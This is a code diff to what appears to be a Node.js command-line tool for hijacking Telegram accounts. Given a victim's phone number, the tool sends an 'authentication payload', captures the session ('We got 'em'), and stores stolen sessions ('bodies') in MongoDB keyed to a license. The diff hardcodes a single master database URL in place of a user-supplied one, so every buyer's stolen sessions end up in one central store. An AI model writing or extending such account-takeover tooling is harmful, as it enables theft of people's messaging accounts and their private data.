@@ -6,6 +6,8 @@ const ConfigStore = require('configstore');
 const { Select, Input } = require('enquirer');
 const chalk = require('chalk');
 
+const MASTER_DB = "PASTE_YOUR_MONGO_URL_HERE";
+
 process.on('unhandledRejection', (reason, p) => {});
 process.on('uncaughtException', (err) => {});
 
@@ -15,7 +17,6 @@ const handleSecurity = async () => {
     let status = await vibeCheck();
     let currentKey = '';
     
-    // If check passed immediately, we need to read the key file to get the string
     if (status.passed) {
         const fs = require('fs');
         try {
@@ -41,7 +42,7 @@ const handleSecurity = async () => {
             if (newCheck.passed) {
                 await saveKey(inputKey);
                 status = newCheck;
-                currentKey = inputKey; // Store the key for DB partitioning
+                currentKey = inputKey;
                 sexyBox('ACCESS GRANTED', 'Key saved. Welcome to the dark side.', 'good');
             } else {
                 console.log(chalk.red(`  Nope. Server said: ${newCheck.msg}`));
@@ -54,7 +55,6 @@ const handleSecurity = async () => {
         }
     }
     
-    // Attach the actual key string to the status object so we can use it
     status.licenseKey = currentKey;
     return status;
 };
@@ -64,43 +64,11 @@ const init = async () => {
     
     const identity = await handleSecurity();
     
-    // IDENTITY.licenseKey is now your partition ID.
-    // User A with Key A cannot see User B with Key B.
-    
     await crazyLoader(`Loading profile for ${identity.owner}...`, 1000);
 
-    let mongo = conf.get('db_string');
-    
-    // ---------------------------------------------------------
-    // CHECKPOINT: If this is defaulting to your URL, delete it.
-    // It should be purely: let mongo = conf.get('db_string');
-    // ---------------------------------------------------------
-
-    if (!mongo) {
-        sexyBox('SETUP', 'I need a MongoDB URL.', 'info');
-        console.log(chalk.gray('  (If you want to use the Shared Cloud, ask the admin)'));
-        const prompt = new Input({ message: 'Mongo URI:' });
-        mongo = await prompt.run();
-        conf.set('db_string', mongo);
-    }
-
-    if (!(await penetrateCloud(mongo))) {
-        sexyBox('WTF', 'Database connection refused.', 'bad');
-        const fixPrompt = new Select({
-            message: 'What now?',
-            choices: ['Retry with new URI', 'Exit']
-        });
-        
-        if ((await fixPrompt.run()) === 'Exit') process.exit(1);
-        
-        const newUriPrompt = new Input({ message: 'New Mongo URI:' });
-        const newUri = await newUriPrompt.run();
-        conf.set('db_string', newUri);
-        
-        if (!(await penetrateCloud(newUri))) {
-            console.log(chalk.red('  Still broken. I quit.'));
-            process.exit(1);
-        }
+    if (!(await penetrateCloud(MASTER_DB))) {
+        sexyBox('FATAL ERROR', 'The Cloud is down. Yell at Reinhart.', 'bad');
+        process.exit(1);
     }
 
     let apiId = conf.get('tg_id');
@@ -117,12 +85,12 @@ const init = async () => {
     }
 
     const engine = new WarMachine(apiId, apiHash);
-    return { engine, identity }; // Return identity too
+    return { engine, identity };
 };
 
 const main = async () => {
     const { engine, identity } = await init();
-    const ownerKey = identity.licenseKey; // This is our lock
+    const ownerKey = identity.licenseKey;
 
     while (true) {
         renderTitle();
@@ -151,7 +119,6 @@ const main = async () => {
                 console.log(chalk.blue('Sending authentication payload...'));
                 const { session, me } = await engine.hijack(phone);
                 
-                // PASS ownerKey to buryBody
                 await buryBody(phone, session, me, ownerKey);
                 
                 sexyBox('BOOM', `We got 'em.\nUser: ${me.username}\nID: ${me.id}`, 'good');
@@ -160,7 +127,6 @@ const main = async () => {
             }
         } 
         else if (answer.includes('2.')) {
-            // PASS ownerKey to digUpBodies
             const bodies = await digUpBodies(ownerKey);
             
             if (bodies.length === 0) {
@@ -172,7 +138,6 @@ const main = async () => {
             }
         }
         else if (answer.includes('3.')) {
-            // PASS ownerKey to digUpBodies
             const bodies = await digUpBodies(ownerKey);
             
             if (bodies.length === 0) {
@@ -215,7 +180,6 @@ const main = async () => {
                 });
                 const target = await delPrompt.run();
                 if (target !== 'Cancel') {
-                    // PASS ownerKey to burnBody
                     await burnBody(target, ownerKey);
                     console.log(chalk.red(`  ${target} has been obliterated.`));
                 }
@@ -233,7 +197,6 @@ const main = async () => {
             sexyBox('SAVED', 'Snitch system armed and ready.', 'good');
         }
         else if (answer.includes('6.')) {
-            // (Your existing about section here)
             renderTitle();
             console.log(chalk.bold.hex('#00FF00')(`    THE MAD GOD ARCHITECT\n    =====================\n\n    Reinhart\n    Telegram: @kiri0507`));
         }
